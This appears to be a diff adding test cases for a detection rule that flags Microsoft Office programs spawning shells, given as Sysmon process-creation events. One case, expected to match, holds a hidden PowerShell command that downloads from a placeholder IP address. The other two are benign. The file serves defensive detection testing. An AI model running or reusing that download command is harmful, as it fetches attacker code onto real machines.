@@ -1,0 +1,28 @@
+rule: office_child_shell.yml
+cases:
+  - name:   winword starts powershell
+    expect: match
+    event:
+      channel:     Microsoft-Windows-Sysmon/Operational
+      event_id:    1
+      ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+      Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      CommandLine: powershell -nop -w hidden -c iwr http://198.51.100.7/a
+
+  - name:   excel opens a linked workbook
+    expect: no-match
+    event:
+      channel:     Microsoft-Windows-Sysmon/Operational
+      event_id:    1
+      ParentImage: C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+      Image:       C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+      CommandLine: EXCEL.EXE /dde
+
+  - name:   explorer starts cmd
+    expect: no-match
+    event:
+      channel:     Microsoft-Windows-Sysmon/Operational
+      event_id:    1
+      ParentImage: C:\Windows\explorer.exe
+      Image:       C:\Windows\System32\cmd.exe
+      CommandLine: cmd.exe
